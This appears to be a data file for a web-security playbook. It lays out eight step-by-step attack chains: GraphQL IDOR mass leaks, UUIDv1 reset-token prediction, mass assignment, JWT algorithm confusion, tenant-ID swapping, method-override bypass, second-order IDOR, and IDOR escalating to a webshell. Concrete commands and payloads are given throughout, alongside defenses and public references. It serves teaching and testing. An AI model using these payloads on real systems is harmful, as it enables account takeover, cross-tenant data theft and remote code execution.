chains.title: IDOR via GraphQL global node IDs + alias batching: leaking billing for all tenants
chains.impact: Mass leak of invoices and payment PII for all tenants in a single request.
chains.why: The 'opaque' base64 node IDs in GraphQL are just a disguised gid://app/Type/123, and aliasing turns a single IDOR into a mass leak while also bypassing the rate limit.
chains.precondition: A GraphQL API with the Relay node(id:) / nodes(ids:) interface where the resolver lacks an object-level access check.
chains.realWorld: Shopify HackerOne #2207248 (IDOR on GraphQL BillingDocumentDownload/BillDetails); HackerOne #2633771; GitLab #2528293.
chains.defense: Enforce access inside every node resolver, not just on the route; alert on requests with an abnormally large number of aliases and fields.

steps.title: Decode the intercepted global ID
steps.detail: echo 'WyJCaWxsaW5nRG9jdW1lbnQiLDEyM10=' | base64 -d  ->  ["BillingDocument",123] / gid://app/BillingDocument/123

steps.title: Confirm IDOR on an adjacent object
steps.detail: Increment int to 124, re-base64, replay in Burp Repeater: query{node(id:"<gid>"){... on BillingDocument{pdfUrl tenant{name}}}}
steps.success: the response contains another tenant's pdfUrl and tenant.name

steps.title: Map adjacent sensitive types
steps.detail: Introspection: query{__schema{types{name fields{name}}}}  ->  find BillDetails, Invoice, Export nodes

steps.title: Mass leak via aliases in one request
steps.detail: query{a1:node(id:"gid0"){...F} a2:node(id:"gid1"){...F} ... a500:node(id:"gid499"){...F}}

steps.title: Move to the file-download resolver
steps.detail: Call BillingDocumentDownload(id:) / fetch the signed pdfUrl per leaked record

chains.title: Sandwich attack: predicting a UUIDv1 reset token for a 0-click ATO
chains.impact: Takeover of any account with no victim interaction, including admins; critical.
chains.why: UUIDv1 reset tokens look random but are a timestamp plus a MAC; by 'sandwiching' the victim's request between two of your own, you narrow the timestamp down to a tiny brute-forceable window.
chains.precondition: A reset, invite, or email-confirmation flow issues a version 1 UUID, and you can see two of your own tokens bracketing the victim's token.
chains.realWorld: landh.tech '0-Click ATO with the Sandwich Attack' (2023); AppSec Labs 'Sandwich Attacks'; intruder.io guidtool.
chains.defense: CSPRNG tokens (UUIDv4 / secrets, 128+ bits), a short single-use TTL, and a rate limit on reset issuance per account and IP.

steps.title: Fingerprint the token as UUIDv1
steps.detail: uuidtool.py <token>  ->  version nibble = 1, identical node (MAC) across requests
steps.success: version=1, the node (MAC) matches across requests

steps.title: First slice: reset your own account
steps.detail: Request a reset for your own account, record token T1 (lower time bound)

steps.title: The filling: reset for the victim
steps.detail: POST /api/password/reset {"email":"victim@target"}  (victim token generated between yours)

steps.title: Second slice: reset your own account again
steps.detail: Request your own reset again, record token T2 (upper time bound)

steps.title: Generate candidates in the window and brute-force confirm
steps.detail: guidtool -t T1 -r T1,T2  (or Lupin-Holmes/sandwich), then loop GET /reset?token=<candidate>

chains.title: Mass assignment and nested-object injection: role and tenancy escalation
chains.impact: Self-escalation to admin and/or moving a user into another organization (cross-tenant control).
chains.why: The backend blindly binds the entire JSON body to the ORM model, so one extra key rewrites your privileges or tenant membership.
chains.precondition: A profile, registration, or settings update (PUT/PATCH /api/users/{me}) that maps directly onto the user entity.
chains.realWorld: RegistrationMagic CVE-2024-1991 (auth->admin); Homakov 2012 GitHub Rails mass assignment; Cobalt 'Mass Assignment in the Wild'.
chains.defense: Bind via an allow-list DTO / strong params; never accept role or tenant_id from the request body; log changes to privileged fields.

steps.title: Learn the model's real field names
steps.detail: Diff GET /api/users/me response keys vs the fields the form submits

steps.title: Brute-force hidden bindable parameters
steps.detail: Burp Param Miner "Guess JSON parameters" / ffuf the body keyspace

steps.title: Inject privileged keys into the update
steps.detail: Add "role":"admin" / "isAdmin":true / "is_staff":true / "permissions":["*"]
steps.success: re-login shows role=admin / an admin route opens

steps.title: If flat keys are filtered: nesting and HPP
steps.detail: "user[role]":"admin", {"organization":{"id":"<otherTenant>"}}, duplicate role=user&role=admin

steps.title: Verify the escalation and move on
steps.detail: Re-auth, then hit an admin-only route to confirm the new privilege

chains.title: JWT role-claim tampering and algorithm confusion: instant admin
chains.impact: Forging an admin token with no credentials, full BFLA escalation across the entire API.
chains.why: The server hands you the very token it trusts; flipping the role claim to admin and re-signing with the public key (RS256 → HS256) or alg:none turns identity into a client-controlled field.
chains.precondition: The app authorizes off JWT claims and either accepts an attacker-chosen alg or exposes the RSA public key (/jwks.json, TLS certificate, recovery from two tokens).
chains.realWorld: PortSwigger 'Algorithm confusion attacks'; Auth0 jsonwebtoken alg:none (CVE-2015-9235); HackTricks JWT.
chains.defense: Hard-pin a single server-side algorithm, reject alg:none, separate keys by purpose, validate kid against an allow-list.

steps.title: Decode the token and find the privilege claim
steps.detail: jwt_tool <jwt>  ->  find "role":"user" / "isAdmin":false / "tenant":"A"

steps.title: Try the trivial bypasses first
steps.detail: jwt_tool <jwt> -X a  (alg:none / strip signature), or flip the claim and replay if the signature is unverified

steps.title: Obtain the RSA public key
steps.detail: Pull /jwks.json, or use jwt_tool rsa_sign2n to derive pubkey.pem from 2 captured tokens

steps.title: Forge an HS256 token signed with the public key
steps.detail: jwt_tool <jwt> -X k -pk pubkey.pem  with "role":"admin","tenant":"victim"
steps.success: the server accepts the forged token, access to the admin API

steps.title: Abuse kid for SQLi or key path traversal
steps.detail: "kid":"../../../dev/null" (empty HMAC key) or kid SQLi to control the HMAC secret

chains.title: Bypassing tenant isolation by tampering with org_id / X-Tenant-ID / Host
chains.impact: Reading and writing any other tenant's data (CRM, invoices, leads); mass cross-tenant leak.
chains.why: The app authenticates you correctly but determines 'which tenant' from a header, path, or body field you control, so a single org_id swap lands you in a neighbor's data.
chains.precondition: A multi-tenant app determines the tenant from a client-supplied X-Tenant-ID / Host / subdomain / org_id rather than from the session.
chains.realWorld: 'Massive Cross-Tenant Access Control Bug' (Medium, 2024); 'Multi-Tenant Authz Bypass via Host Header'; OWASP Multi-Tenant Security Cheat Sheet.
chains.defense: Derive the tenant strictly from the authenticated session or token; add a row-level tenant_id = session.tenant check on every request.

steps.title: Diff every request across two sessions
steps.detail: Burp Autorize using Tenant-B cookies as the comparison identity

steps.title: Swap the tenant selector while keeping your own session
steps.detail: Change X-Tenant-ID, org_id=, /api/orgs/{otherOrg}/..., or Host: tenantB.app.com
steps.success: the response holds another tenant's data (leads/invoices)

steps.title: Enumerate tenant identifiers
steps.detail: ffuf -w orgids.txt -H "X-Tenant-ID: FUZZ" -u https://app/api/data  (filter on 200/size)

steps.title: Confirm write impact too
steps.detail: Replay the swap on POST/PUT/DELETE (edit leads, delete records), not just GET

steps.title: Escalate into another tenant's admin surface
steps.detail: POST /api/orgs/{victim}/members {"email":"me","role":"admin"}

chains.title: HTTP method confusion and method-override: bypassing the authz middleware
chains.impact: Access to admin actions (self-escalation, reading others' data) when only one method is protected.
chains.why: Authorization is attached to POST /admin/..., but the framework still routes GET and override-header variants to the same handler, so changing the method slips past the check.
chains.precondition: Access control is keyed on the method or Content-Type (e.g., middleware on POST only) while the framework still handles alternative verbs.
chains.realWorld: ESPv2 JWT bypass via X-HTTP-Method-Override (GHSA-6qmp-9p95-fc5f); PortSwigger 'Method-based access control'; HackerOne #775560.
chains.defense: Enforce authorization in a method-agnostic layer; ignore override headers unless explicitly needed; deny-by-default on unlisted verbs.

steps.title: Capture a baseline of the protected call
steps.detail: POST /api/admin/users/promote {"role":"admin"}  ->  403 baseline

steps.title: Change the HTTP method
steps.detail: Same path as GET /api/admin/users/promote?role=admin, or PUT/PATCH/HEAD
steps.success: a 200 response and the action performed instead of 403

steps.title: Slip in method-override headers
steps.detail: POST + header X-HTTP-Method-Override: GET / X-Method-Override / body _method=PUT

steps.title: Change Content-Type against format-based filters
steps.detail: Content-Type application/json  ->  application/x-www-form-urlencoded or text/plain, same params

steps.title: Automate the method-and-header matrix
steps.detail: ffuf -X FUZZ over {GET,POST,PUT,PATCH,HEAD,OPTIONS} + override-header wordlist

chains.title: Second-order IDOR: write here, read there
chains.impact: Leaking other users' and tenants' PII through a secondary read path that bypasses the front-door authorization.
chains.why: You plant a reference to someone else's object where input is validated, but another feature later dereferences it with no check at all.
chains.precondition: Two linked features: one stores the ID you supply, the other later renders or sends data for that ID.
chains.realWorld: Ozgur Alp 'A Less Known Attack Vector: Second-Order IDOR Attacks'; Intigriti 'Advanced IDOR' guide.
chains.defense: Re-check object access at render or read time, not just on write; never treat a stored ID as pre-validated.

steps.title: Find a 'write here, read there' pair
steps.detail: Saved templates, "share", scheduled report, audit/activity feed, webhook target

steps.title: Plant the victim's object ID in the write field
steps.detail: POST /reports {"data_source_id":<victimId>}  (write-side only checks you own the report)

steps.title: Trigger the secondary read path
steps.detail: Run the export / open the activity log / fire the webhook that resolves data_source_id server-side

steps.title: Collect the leaked data from the second channel
steps.detail: Read the generated PDF/CSV or the webhook callback now containing victim PII
steps.success: the victim's PII appears in the PDF/CSV or the webhook callback

steps.title: Scale across the ID range
steps.detail: Loop the plant-then-trigger over sequential victim IDs

chains.title: Sequential IDOR → client-side isAdmin tampering → full admin → RCE
chains.impact: From a single +1 to an ID, to thousands of customer records, a shared admin panel, and RCE via file upload/SSTI; full platform compromise.
chains.why: A boring sequential-ID IDOR on the dashboard becomes a disaster the moment you notice the login response carries isadmin:false that only the client checks.
chains.precondition: Sequential object IDs, an admin flag returned to and trusted from the client, and an admin panel with content or file-upload features.
chains.realWorld: Eaton Zveare 'Compromising Honda's eCommerce dealer platform' (eaton-works.com, 2023); HackerOne Atavist #950881 (IDOR email change -> ATO).
chains.defense: Never trust client-returned role / isadmin; enforce server-side RBAC on every admin route; lock down file and template uploads in the admin panel.

steps.title: Walk sequential IDs (horizontal IDOR)
steps.detail: siteId=1004 then +1 reveals another dealer's dashboard and orders

steps.title: Tamper with the admin flag in the auth response
steps.detail: Burp Match&Replace "isadmin":false  ->  "isadmin":true  (or the local role cookie / JS state)

steps.title: Force-browse the now-exposed admin routes
steps.detail: ffuf -w admin-paths.txt -u https://app/admin/FUZZ  ->  /admin/users, /admin/network

steps.title: Mass-export PII for all tenants
steps.detail: Admin "export orders" pulls all dealers' customer records across years

steps.title: Turn admin into code execution
steps.detail: Admin template editor  ->  SSTI, or admin file/theme upload  ->  webshell  ->  RCE
